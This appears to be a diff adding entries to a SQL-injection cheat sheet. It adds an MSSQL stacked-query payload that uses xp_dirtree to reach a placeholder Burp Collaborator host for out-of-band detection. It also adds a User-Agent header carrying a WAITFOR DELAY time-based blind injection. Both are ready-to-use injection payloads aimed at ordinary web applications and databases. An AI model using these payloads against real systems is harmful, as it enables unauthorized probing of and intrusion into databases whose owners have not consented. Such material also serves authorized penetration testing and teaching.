@@ -298,6 +298,16 @@ now()
 @@log_error
 @@GLOBAL.have_symlink
 ```
+>for burp collabtour
+```
+;declare @q varchar(99);set @q=’\\[YOU_BURP_COLLAB_SUBDOMAIN_PART_HERE].burpcollab’+’orator.net\ogy’; exec master.dbo.xp_dirtree @q; —
+
+```
+>next cooking example
+```
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36';WAITFOR DELAY ‘00:00:05’;--
+```
+
 >tool automatic
 
 ```
